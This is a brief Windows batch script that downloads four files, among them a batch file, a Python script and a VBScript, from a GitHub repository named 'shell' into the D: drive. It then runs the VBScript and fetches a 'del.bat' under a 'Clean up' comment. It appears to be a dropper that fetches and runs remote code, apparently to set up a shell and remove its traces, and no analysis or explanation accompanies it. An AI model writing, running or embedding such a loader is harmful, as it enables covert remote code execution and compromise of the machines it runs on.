@echo off

REM Download files
curl -o D:\pro.bat https://raw.githubusercontent.com/0x2034/shell/main/pro.bat 
curl -o D:\sh.py https://raw.githubusercontent.com/0x2034/shell/main/sh.py 
curl -o D:\vb.vbs https://raw.githubusercontent.com/0x2034/shell/main/vb.vbs 
curl -o D:\del.bat https://raw.githubusercontent.com/0x2034/shell/main/del.bat 

REM Execute VBScript
start /wait wscript.exe D:\vb.vbs

REM Clean up
curl -o D:\del.bat https://raw.githubusercontent.com/0x2034/shell/main/del.bat 

REM Exit script
exit
